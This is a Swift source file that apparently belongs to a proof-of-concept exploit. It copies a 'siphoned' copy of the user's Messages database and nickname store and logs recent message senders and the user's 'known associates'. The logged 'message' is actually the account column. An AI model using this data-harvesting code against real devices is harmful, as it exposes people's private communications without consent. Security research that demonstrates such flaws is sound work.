//
//  DatabaseOperations.swift
//  inputcontrol
//
//  Created by Spotlight Deveaux on 2022-11-19.
//

import Foundation
import SQLite3

enum DatabaseErrors: Error {
    case failedToOpen
    case queryError
}

func queryChatDatabase() throws {
    // First, let's copy the chat database to a usable location.
    let chatDbPath = try temporaryFile(named: "user-chat.db").path()
    try FileManager.default.copyItem(atPath: siphonedFilePath(), toPath: chatDbPath)

    // We can then open it as a standard SQLite3 database and retrieve the last 5 messages.
    var db: OpaquePointer?
    guard sqlite3_open(chatDbPath, &db) == SQLITE_OK else {
        sqlite3_close(db)
        throw DatabaseErrors.failedToOpen
    }

    // Quick query.
    let query = """
    SELECT
        h.id, m.account
    FROM message AS m
        LEFT JOIN handle AS h on m.handle_id = h.rowid
    WHERE m.text != '' AND h.id != ''
    ORDER BY m.date DESC
    LIMIT 5;
    """.cString(using: .utf8)

    log(entry: "Last five messages recieved (as possible):")
    let result = sqlite3_exec(db, query, { _, columns, values, _ in
        // We only queried two columns.
        assert(columns == 2)

        // Loop through all values.
        let sender = string(from: values, at: 0)
        let message = string(from: values, at: 1)

        log(entry: "💬 From \(sender): \(message)")

        return 0
    }, nil, nil)
    guard result == SQLITE_OK else {
        sqlite3_close(db)
        throw DatabaseErrors.queryError
    }

    sqlite3_close(db)
}

func queryNicknameStore() throws {
    // We can copy the nickname database to a usable location.
    let chatDbPath = try temporaryFile(named: "nicknames.db").path()
    try FileManager.default.copyItem(atPath: siphonedFilePath(), toPath: chatDbPath)

    // Similar to chat.db, we can open it as a standard SQLite3 database.
    var db: OpaquePointer?
    guard sqlite3_open(chatDbPath, &db) == SQLITE_OK else {
        sqlite3_close(db)
        throw DatabaseErrors.failedToOpen
    }

    // Quick query.
    let query = "SELECT key FROM kvtable;".cString(using: .utf8)

    log(entry: "Known associates of user (possibly empty):")
    let result = sqlite3_exec(db, query, { _, columns, values, _ in
        assert(columns == 1)

        let user = string(from: values, at: 0)
        log(entry: "👤 \(user)")

        return 0
    }, nil, nil)
    guard result == SQLITE_OK else {
        sqlite3_close(db)
        throw DatabaseErrors.queryError
    }

    sqlite3_close(db)
}

/// Helper to default to an empty string on array access failure.
/// - Parameters:
///   - buffer: The array to access from.
///   - index: The index to query.
/// - Returns: A string, either with the actual value, or empty.
func string(from buffer: UnsafeMutablePointer<UnsafeMutablePointer<CChar>?>?, at index: Int) -> String {
    guard let buffer else {
        return ""
    }
    guard let pointer = buffer[index] else {
        return ""
    }

    return String(cString: pointer)
}
